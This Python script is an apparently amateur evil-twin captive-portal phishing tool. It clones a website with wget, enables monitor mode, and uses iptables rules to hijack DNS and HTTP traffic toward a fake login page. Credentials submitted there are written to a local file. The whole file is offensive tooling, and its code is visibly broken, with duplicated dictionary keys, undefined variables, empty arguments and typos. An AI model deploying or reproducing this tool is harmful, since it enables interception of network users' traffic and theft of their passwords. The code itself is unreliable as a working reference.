#!/usr/bin/python3
import os
import re
import cgi
import sys
import cgitb
import argparse
import ipaddress 
import traceback
import subprocess
import http.server
from pathtools import path
import socketserver as socketserver
from http.server import HTTPServer as Webserver
from core import PybashyRunFunction,error_printer
from core import ExecutionPool,CommandSet,GenPerp_threader
from core import FunctionSet,ModuleSet,Command,run_test,CommandRunner
#try:
#    from urllib.parse import urlparse
#except ImportError:
#    from urlparse import urlparse
#try:
#    import SocketServer as socketserver
#except ImportError:
try:
    import colorama
    from colorama import init
    init()
    from colorama import Fore, Back, Style
    COLORMEQUALIFIED = True
except ImportError as derp:
    print("[-] NO COLOR PRINTING FUNCTIONS AVAILABLE, Install the Colorama Package from pip")
    COLORMEQUALIFIED = False

blueprint  = lambda text: print(Fore.BLUE + ' ' +  text + ' ' + Style.RESET_ALL) if (COLORMEQUALIFIED == True) else print(text)
greenprint = lambda text: print(Fore.GREEN + ' ' +  text + ' ' + Style.RESET_ALL) if (COLORMEQUALIFIED == True) else print(text)
redprint   = lambda text: print(Fore.RED + ' ' +  text + ' ' + Style.RESET_ALL) if (COLORMEQUALIFIED == True) else print(text)
yellow_bold_print = lambda text: print(Fore.YELLOW + Style.BRIGHT + ' {} '.format(text) + Style.RESET_ALL) if (COLORMEQUALIFIED == True) else print(text)

parser = argparse.ArgumentParser(description='Captive Portal tool')
parser.add_argument('--target',
                                 dest    = 'target',
                                 action  = "store" ,
                                 default = "http://127.0.0.1.index.html", 
                                 help    = "Website to mirror, this is usually the only option you should set. Multiple downloads \
                                            will be stored in thier own directories, ready for hosting internally. " )
parser.add_argument('--wget_options',
                                 dest    = 'wget_options',
                                 action  = "store" ,
                                 default = "-nd -H -np -k -p -E" ,
                                 help    = "Wget options, Mirroring to a subdirectory is the default \n DEFAULT : -nd -H -np -k -p -E" )
parser.add_argument('--user-agent',
                                 dest    = 'useragent',
                                 action  = "store" ,
                                 default = 'Mozilla/5.0 (X11; Linux x86_64;x rv:28.0) Gecko/20100101  Firefox/28.0' ,
                                 help    = "User agent to bypass crappy limitations \n DEFAULT : Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101  Firefox/28.0" )
parser.add_argument('--directory_prefix',
                                 dest    = 'directory_prefix',
                                 action  = "store" ,
                                 default = './website_mirrors/' ,
                                 help    = "Storage dirctory to place the downloaded files in, defaults to script working directory" )
parser.add_argument('--monitor_iface',
                                 dest    = 'moniface',
                                 action  = "store" ,
                                 default = 'mon0' ,
                                 help    = "" )
parser.add_argument('--ethernet_iface',
                                 dest    = 'iface',
                                 action  = "" ,
                                 default = '' ,
                                 help    = "" )
parser.add_argument('--ethernet_iface_name',
                                 dest    = 'iface_name',
                                 action  = "" ,
                                 default = '' ,
                                 help    = "" )                                 
parser.add_argument('--filename',
                                 dest    = 'filename',
                                 action  = "" ,
                                 default = '' ,
                                 help    = "" )                                 
parser.add_argument('--port',
                                 dest    = 'port',
                                 action  = "store" ,
                                 default = '9090' ,
                                 help    = "Port you are serving the HTML/captive portal from" )                                 
parser.add_argument('--portal_page',
                                 dest    = 'portalpage',
                                 action  = "store" ,
                                 default = 'index.html' ,
                                 help    = "index page to serve" )                                 
parser.add_argument('--htmldirectory',
                                 dest    = 'htmldirectory',
                                 action  = "store" ,
                                 default = './html/' ,
                                 help    = "directory the captive portal index is in" )                                 
parser.add_argument('--',
                                 dest    = '',
                                 action  = "" ,
                                 default = '' ,
                                 help    = "" )                                 
parser.add_argument('--',
                                 dest    = '',
                                 action  = "" ,
                                 default = '' ,
                                 help    = "" )                                 
parser.add_argument('--',
                                 dest    = '',
                                 action  = "" ,
                                 default = '' ,
                                 help    = "" )                                 

# These variables are used as settings
#set to your appropriate ifaces
#moniface,iface='eth0','eth1'
#PORT=9090         # the port in which the captive portal web server listens
#IFACE="wlan2"      # the interface that captive portal protects
#IP_ADDRESS="192.168.0.1" # the ip address of the captive portal (it can be the IP of IFACE)
#filename='credentials.txt'
#hostlist , networkaddrpool = [] , []
#i1name, i2name,i3name  = 'username' , 'email' , 'submit'
#portalpage = '/portal/login.php.html'
#credentials = [[ 'nikos' , 'fotiou'] , # please keep this here at least commented, its to cite them.
#                ['user1' , 'password'],
#                ['user2' , 'password2'],
#                ['hacker' , 'root']]

class GetPage():
    """"""
    def __init__(self, directory_prefix:str, target:str , useragent:str , wget_options:str):
        try:
            shell_env = os.environ
            self.request_headers    = {'User-Agent' : useragent }
            self.storage_directory  = directory_prefix
            self.wget_options        = wget_options
            # TODO: add user agent headers to prevent fuckery 
            self.wget_command  = {'command'      : 'wget {} --directory-prefix={} {}'.format(self.wget_options , self.storage_directory, target),
                                'info_message'   : "[+] Fetching Webpage",
                                'success_message': "[+] Page Downloaded",
                                'failure_message': "[-] Download Failure"
                                }

            command         = self.wget_command.get('command')
            info_message    = self.wget_command.get('info_message')
            success_message = self.wget_command.get('success_message')
            failure_message = self.wget_command.get('failure_message')
            step = subprocess.Popen( command,
                                         shell =shell_env,
                                         stdout=subprocess.PIPE,
                                         stderr=subprocess.PIPE)
            output, error = step.communicate()
            # output formatting can go here
            #for output_line in step.stdout:
            #    print(output_line)
            #for error_lines in step.stderr:
            #    print(error_lines)
            for output_line in output.decode().split('\n'):
                greenprint(output_line)
            #error formatting can go here
            for error_lines in error.decode().split('\n'):
                redprint(error_lines)
            if step.returncode == 0 :
                yellow_bold_print(success_message)
            else:
                redprint(failure_message)
        except Exception as derp:
            error_printer("[-] Shell Command failed!")

class BackendServer():
    def __init__(self, progargs, inames = ['username','email','password'] ):
        '''
iname are the inputs you are attempting to capture
    pass it the names as strings in a list
        - [str,str,str,str]
        
        '''
        # basic variables for existance
        self.formdata        = cgi.FieldStorage()
        self.portalpage      = progargs.portalpage
        self.PORT            = progargs.port
        self.ipaddress       = progargs.ipaddress
        self.iface           = progargs.iface
        self.moniface        = progargs.moniface

        #dynamically create the data sniffers
        counter = 0
        #set to the names of the inputs to catch them
        # makes a new attribute containing the name of the html 
        # form field to snag the data from
        for inputname in inames:
            setattr(self,"input" + str(counter +1), self.formdata.getvalue(inputname))

    def RunServer(self):
        # setup the core functions
        # we need to establish the mitm network with the json 
        # contained in EstablishMITMnetwork()
        #execution pool to hold command set
        self.exec_pool          = ExecutionPool()
        #self.module_set         = ModuleSet('test1')
        self.function_prototype = CommandSet()
        #self.new_function       = FunctionSet()
        #self.runner             = CommandRunner(exec_pool = self.exec_pool)
        
        #run tests from the core.py
        run_test()
        ###################################################
        #       HERE IS WHERE THE WERVER IS STARTED
        ###################################################
        #set monitor mode on flagged interface
        self.setmon()
        PybashyRunFunction(self.EstablishMITMnetwork)
        greenprint("Starting web server")
        self.serveportal()

    #sets monitor mode
    def setmon(self):
        try:
            subprocess.check_output(["iwconfig", self.moniface,  "mode", "monitor"], stderr=subprocess.PIPE)
            greenprint("[+] Monitor Mode Enabled")
        except subprocess.CalledProcessError:
            redprint("[-] Failed to set monitor mode")

    def serveportal(self):
        httpd = http.server.HTTPServer((ipaddress, PORT), CaptivePortal)
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            pass

    def EstablishMITMnetwork(self):
        ''' functions as command payloads should not be called until the class is initialized'''
        steps = {
        "InterfaceDown": {
            "command"         : "ip link set {0} down".format(self.iface),
            "info_message"    : "[+] Bringing down Interface : {}".format(self.iface),
            "success_message" : "[+] Command Sucessful", 
            "failure_message" : "[-] Command Failed! Check the logfile!"
                        },
        "AddInterface": {
            "command"         : "ip addr add {0} dev {1}".format(self.ipaddress, self.iface),
            "info_message"    : "[+] Adding New Interface : {}".format(self.iface),
            "success_message" : "[+] Command Sucessful", 
            "failure_message" : "[-] Command Failed! Check the logfile!"           
            },

        "InterfaceUp": {
            "command"         : "ip link set {0} up".format(self.iface),
            "info_message"    : "[+] Initializing Interface : {}".format(self.iface),
            "success_message" : "[+] Command Sucessful", 
            "failure_message" : "[-] Command Failed! Check the logfile!"           
            },

        #"status" : greenprint("[+]Clearing IP Tables Rulesets"),
        
        "IPTablesFlush": {
            "command"         : "iptables -w 3 --flush",
            "info_message"    : "[+] Flushing IPTables Rulesets",
            "success_message" : "[+] Command Sucessful", 
            "failure_message" : "[-] Command Failed! Check the logfile!"           
            },
        
        "IPTablesFlushNAT"   : {
            "command"         : "iptables -w 3 --table nat --flush",
            "info_message"    : "[+] Flushing IPTables NAT Rulesets",
            "success_message" : "[+] Command Sucessful", 
            "failure_message" : "[-] Command Failed! Check the logfile!"           
            },
        
        "IPTablesDeleteChain": {
            "command"         : "iptables -w 3 --delete-chain",
            "info_message"    : "[+] Flushing IPTables NAT Rulesets",
            "success_message" : "[+] Command Sucessful", 
            "failure_message" : "[-] Command Failed! Check the logfile!"           
            },

        "IPTablesDeleteChainNAT": {
            "command"         : "iptables -w 3 --table nat --delete-chain",
            "info_message"    : "[+] Flushing IPTables NAT Rulesets",
            "success_message" : "[+] Command Sucessful", 
            "failure_message" : "[-] Command Failed! Check the logfile!"           
            },

        "IPTablesDeleteChainNAT": {
            "command"         : "echo 1 > /proc/sys/net/ipv4/ip_forward",
            "info_message"    : "[+] enable ip Forwarding",
            "success_message" : "[+] Command Sucessful", 
            "failure_message" : "[-] Command Failed! Check the logfile!"           
            },

        #"status" : greenprint("[+]Setup a NAT environment"),
        
        "IPTablesDeleteChainNAT": {
            "command"         : "iptables -w 3 --table nat --append POSTROUTING --out-interface {0} -j MASQUERADE".format(self.iface),
            "info_message"    : "[+] Setup a NAT environment",
            "success_message" : "[+] Command Sucessful", 
            "failure_message" : "[-] Command Failed! Check the logfile!"           
            },
        
        #greenprint("[+]allow incomming from the outside on the monitor iface")
        
        "IPTablesDeleteChainNAT": {
            "command"         : "iptables -w 3 --append FORWARD --in-interface {0} -j ACCEPT".format(self.moniface),
            "info_message"    : "[+] [+]allow incomming from the outside on the monitor iface",
            "success_message" : "[+] Command Sucessful", 
            "failure_message" : "[-] Command Failed! Check the logfile!"           
            },
        
        
        #greenprint("[+]allow UDP DNS resolution inside the NAT  via prerouting"),
        
        "IPTablesDeleteChainNAT": {
            "command"         : "iptables -w 3 -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to {}".format(self.ipaddress),
            "info_message"    : "[+] Allow UDP DNS resolution inside the NAT  via prerouting",
            "success_message" : "[+] Command Sucessful", 
            "failure_message" : "[-] Command Failed! Check the logfile!"           
            },
        
        
        #greenprint("[+]Allow Loopback Connections"),
        
        "IPTablesDeleteChainNAT": {
            "command"         : "iptables -w 3 -A INPUT -i lo -j ACCEPT",
            "info_message"    : "[+]Allow Loopback Connections",
            "success_message" : "[+] Command Sucessful", 
            "failure_message" : "[-] Command Failed! Check the logfile!"           
            },
        
        
        "IPTablesDeleteChainNAT": {
            "command"         : "iptables -w 3 -A OUTPUT -o lo -j ACCEPT",
            "info_message"    : "[+] enable ip Forwarding",
            "success_message" : "[+] Command Sucessful", 
            "failure_message" : "[-] Command Failed! Check the logfile!"           
            },
        
        
        #greenprint("[+]Allow Established and Related Incoming Connections")
        
        "IPTablesDeleteChainNAT": {
            "command"         : "iptables -w 3 -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT",
            "info_message"    : "[+] Allow Established and Related Incoming Connections",
            "success_message" : "[+] Command Sucessful", 
            "failure_message" : "[-] Command Failed! Check the logfile!"           
            },
        
        
        #greenprint("[+]Allow Established Outgoing Connections")
        
        "IPTablesDeleteChainNAT": {
            "command"         : "iptables -w 3 -A OUTPUT -m conntrack --ctstate ESTABLISHED -j ACCEPT",
            "info_message"    : "[+] Allow Established Outgoing Connections",
            "success_message" : "[+] Command Sucessful", 
            "failure_message" : "[-] Command Failed! Check the logfile!"           
            },
        
        
        #greenprint("[+]Internal to External")
        
        "IPTablesDeleteChainNAT": {
            "command"         : "iptables -w 3 -A FORWARD -i {0} -o {1} -j ACCEPT".format(self.moniface, self.iface),
            "info_message"    : "[+] Internal to External",
            "success_message" : "[+] Command Sucessful", 
            "failure_message" : "[-] Command Failed! Check the logfile!"           
            },
        #greenprint("[+]Drop Invalid Packets")
        
        "IPTablesDeleteChainNAT": {
            "command"         : "iptables -w 3 -A INPUT -m conntrack --ctstate INVALID -j DROP",
            "info_message"    : "[+] Drop Invalid Packets",
            "success_message" : "[+] Command Sucessful", 
            "failure_message" : "[-] Command Failed! Check the logfile!"           
            },
        
        
        "IPTablesDeleteChainNAT": {
            "command"         : "iptables -w 3 -A FORWARD -i IFACE -p tcp --dport 53 -j ACCEPT",
            "info_message"    : "[+] Drop Invalid Packets",
            "success_message" : "[+] Command Sucessful", 
            "failure_message" : "[-] Command Failed! Check the logfile!"           
            },
        
        "IPTablesDeleteChainNAT": {
            "command"         : "iptables -w 3 -A FORWARD -i IFACE -p udp --dport 53 -j ACCEPT",
            "info_message"    : "[+] Drop Invalid Packets",
            "success_message" : "[+] Command Sucessful", 
            "failure_message" : "[-] Command Failed! Check the logfile!"           
            },
        
        #redprint(".. Allow traffic to captive portal")
        
        "IPTablesDeleteChainNAT": {
            "command"         : "iptables -w 3 -A FORWARD -i IFACE -p tcp --dport {} -d {} -j ACCEPT".format(self.port, self.ipaddress),
            "info_message"    : "[+]Allow traffic to captive portal",
            "success_message" : "[+] Command Sucessful", 
            "failure_message" : "[-] Command Failed! Check the logfile!"           
            },
        
        #redprint(".. Block all other traffic")
        
        "IPTablesBlockAll": {
            "command"         : "iptables -w 3 -A FORWARD -i IFACE -j DROP",
            "info_message"    : "[+] Block all other traffic",
            "success_message" : "[+] Command Sucessful", 
            "failure_message" : "[-] Command Failed! Check the logfile!"           
            },
        #greenprint("Redirecting HTTP traffic to captive portal")
        "IPTablesDeleteChainNAT": {
            "command"         : "iptables -t nat -A PREROUTING -i IFACE -p tcp --dport 80 -j DNAT --to-destination {}:{}".format(self.ipaddress, self.port),
            "info_message"    : "[+] Redirecting HTTP traffic to captive portal",
            "success_message" : "[+] Command Sucessful", 
            "failure_message" : "[-] Command Failed! Check the logfile!"           
            }
        }

class Redirect(http.server.SimpleHTTPRequestHandler):
    def __init__(self):
        pass
    def ServeInitRedirect(self):
        #whenever this script is called you get sent to the portal first
        print('Content-Type : text/html')
        print('Location : /' + portalpage)
        print("")
        print('<html>\n<head>\n<meta http-equiv="refresh" content="0;url='+ ipadrress + PORT + portalpage + '" />\n</head>\n<body></body>\n</html>')



class CaptivePortal(http.server.SimpleHTTPRequestHandler):
    #this is the index of the captive portal
    #it simply redirects the user to the to login page
    html_redirect = """
    <html>
    <head>
        <meta http-equiv="refresh" content="0; url=http://{0}{1}{2}" />
    </head>
    <body>
        <b>Redirecting to MITM hoasted captive portal page</b>
    </body>
    </html>
    """.format(IP_ADDRESS, PORT, portalpage)
    html_login = """
    <!DOCTYPE html>
    <html>
    <head>
    <meta charset="utf-8" />
    <title></title>
    </head>
    <body>
    <form class="login" action="do_POST" method="post">
    <input type="text" name="username" value="username">
    <input type="text" name="password" value="password">
    <input type="submit" name="submit" value="submit">
    </form>
    </body>
    </html>
    """

    def authpassthrough(self):
        redprint('Updating IP tables to allow {0} through'.format(remote_IP))
        payload = {
        "IPTablesAcceptNAT": {
            "command"         : "iptables -t nat -I PREROUTING 1 -s {} -j ACCEPT".format(remote_IP),
            "info_message"    : "[+] Drop Invalid Packets",
            "success_message" : "[+] Command Sucessful", 
            "failure_message" : "[-] Command Failed! Check the logfile!"           
            },
        "IPTablesDeleteChainNAT": {
            "command"         : "iptables -I FORWARD -s {} -j ACCEPT".formnat(remote_IP),
            "info_message"    : "[+] Drop Invalid Packets",
            "success_message" : "[+] Command Sucessful", 
            "failure_message" : "[-] Command Failed! Check the logfile!"           
            }
        }

    def authenticate(self, username, password):
        for username_password in credentials:
            if username_password[0][0] == username and credentials[username_password[0][0]] == password:
                remote_IP = self.client_address[0]
                greenprint('New authorization from '+ remote_IP)
                greenprint('adding to address pool')
                networkaddrpool.append(remote_IP)
                self.wfile.write("You are now hacker authorized. Navigate to any URL")
                authpassthrough()
            else:
                self.wfile.write(self.html_login)


    def savecredentials(self, filename):
        remote_IP = self.client_address[0]
        hostlist.append(remote_IP)
        self.formdata = cgi.FieldStorage()
        try:
            with open(filename, 'ab') as filehandle:
                input1 = self.formdata.getvalue(i1name)
                input2 = self.formdata.getvalue(i2name)
                input3 = self.formdata.getvalue(i3name)
                filehandle.write(formdata.getvalue(i1name))
                filehandle.write('\n')
                filehandle.write(formdata.getvalue(i2name))
                filehandle.write('\n\n')
                filehandle.close()
        except Exception as e:
            raise

        payload = {
        "": {
            "command"         : "iptables -t nat -I PREROUTING 1 -s {} -j ACCEPT".format(remote_ip),
            "info_message"    : "[+] Drop Invalid Packets",
            "success_message" : "[+] Command Sucessful", 
            "failure_message" : "[-] Command Failed! Check the logfile!"           
            },
        "IPTablesDeleteChainNAT": {
            "command"         : "iptables -I FORWARD -s {}, -j ACCEPT".format(remote_IP),
            "info_message"    : "[+] Drop Invalid Packets",
            "success_message" : "[+] Command Sucessful", 
            "failure_message" : "[-] Command Failed! Check the logfile!"           
            }
        }

        self.wfile.write("You are now authorized. Navigate to any URL")

    def do_GET(self):
        path = self.path
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        if path == "/":
            self.wfile.write(self.html_login)
        else:
            #we are using an external file instead of a local variable
            self.wfile.write(self.html_redirect)

    def do_POST(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        form = cgi.FieldStorage(
            fp=self.rfile,
            headers=self.headers,
            environ={'REQUEST_METHOD':'POST',
                     'CONTENT_TYPE':self.headers['Content-Type'],
                     })
        username = form.getvalue("username")
        password = form.getvalue("password")
        authenticate(username,password)

    def savecredentials(self, filename):
        try:
            with open(filename, 'ab') as filehandle:
                input1 = formdata.getvalue(i1name)
                input2 = formdata.getvalue(i2name)
                input3 = formdata.getvalue(i3name)
                filehandle.write(formdata.getvalue(i1name))
                filehandle.write('\n')
                filehandle.write(formdata.getvalue(i2name))
                filehandle.write('\n\n')
                filehandle.close()
        except Exception as e:
            raise

if __name__ == "__main__":
    arguments  = parser.parse_args()
    # we can either run the progrma to capture a captive portal
    if arguments.mirror == True :
        wget_thing = GetPage(arguments.directory_prefix,
                         arguments.target,
                         arguments.useragent,
                         arguments.wget_options)
    # or serve a captured portal
    elif arguments.portal == True:
        BackendServer(arguments)
